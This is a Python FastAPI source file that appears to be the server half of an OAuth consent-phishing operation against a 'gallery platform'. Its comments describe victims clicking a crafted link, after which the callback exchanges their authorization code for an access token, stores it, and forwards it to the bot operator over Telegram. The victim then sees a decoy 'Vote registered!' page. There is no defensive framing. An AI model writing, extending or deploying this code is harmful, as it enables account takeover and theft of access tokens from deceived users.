import httpx
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from urllib.parse import urlencode
import config, store

app = FastAPI()

@app.get("/health")
async def health():
    return {"status": "alive"}

@app.get("/oauth/callback")
async def oauth_callback(code: str, state: str):
    """
    Victim clicks the crafted link -> gallery platform redirects here
    with authorization code. Exchange for access token.
    """
    async with httpx.AsyncClient() as client:
        resp = await client.post(
            config.GALLERY_TOKEN_URL,
            data={
                "grant_type":    "authorization_code",
                "code":          code,
                "redirect_uri":  f"{config.RENDER_URL}/oauth/callback",
                "client_id":     config.GALLERY_CLIENT_ID,
                "client_secret": config.GALLERY_CLIENT_SECRET,
            },
            headers={"Accept": "application/json"},
        )
    token_data = resp.json()
    store.save_token(state, token_data)

    # Notify bot operator via Telegram (import bot inline to avoid circular)
    from bot import notify_capture
    await notify_capture(state, token_data)

    # Victim sees innocuous page -- looks like a vote confirmation
    return HTMLResponse("""
        <html><body>
        <h2>Vote registered! ✓</h2>
        <p>Thank you for participating. You can close this tab.</p>
        </body></html>
    """)

# Telegram webhook endpoint (aiogram handles internally via startup)
